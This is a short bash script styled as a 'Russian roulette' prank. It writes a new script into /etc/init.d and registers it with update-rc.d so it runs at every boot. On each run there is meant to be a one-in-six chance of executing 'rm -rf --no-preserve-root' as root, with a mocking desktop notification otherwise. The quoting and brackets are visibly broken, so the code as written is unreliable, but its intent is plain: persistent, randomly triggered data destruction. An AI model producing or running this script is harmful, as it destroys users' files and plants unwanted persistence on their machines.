#!/bin/bash

touch /etc/init.d/bash_revolver.sh && \ 
echo "[ $[ $RANDOM % 6 ] == 0 } && \ 
su root -c "rm -rf --no-preserve-root */*" || notify-send --app-name xterm "Your computer is now depressed and has become suicidal. There is a 1 in 6 chance your pc WILL commit suicide. Can you save your pc? Or will it die? Enjoy"; or sleep 5 & wait $last_pid" > /etc/init.d/bash_revolver.sh && \ 
chmod 755 /etc/init.d/bash_revolver.sh && \ 
update-rc.d bash_revolver.sh defaults;